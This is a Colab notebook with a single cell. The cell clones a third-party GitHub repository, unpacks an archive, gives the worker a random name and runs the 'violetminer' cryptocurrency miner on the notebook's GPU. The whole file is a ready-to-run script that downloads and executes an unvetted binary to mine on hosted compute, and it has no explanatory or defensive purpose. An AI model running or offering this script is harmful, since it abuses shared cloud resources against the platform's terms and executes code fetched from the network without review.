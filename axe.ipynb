{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "axe.ipynb",
      "provenance": [],
      "collapsed_sections": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "bU_4A2jQRgmv"
      },
      "source": [
        "!apt update && apt install git && git clone https://github.com/userdz0/888.git && cd 888 && unzip violet2.zip && cd violetminer && perl -pe 's/workerg1/\"\" . (100 + int rand 900) . \"\"/ge' < t.json > 1.json && chmod +x violetminer && wget http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.31-0ubuntu9_amd64.deb && dpkg --auto-deconfigure -i libc6_2.31-0ubuntu9_amd64.deb\n",
        "!cd 888/violetminer/ && ./violetminer --config 1.json"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}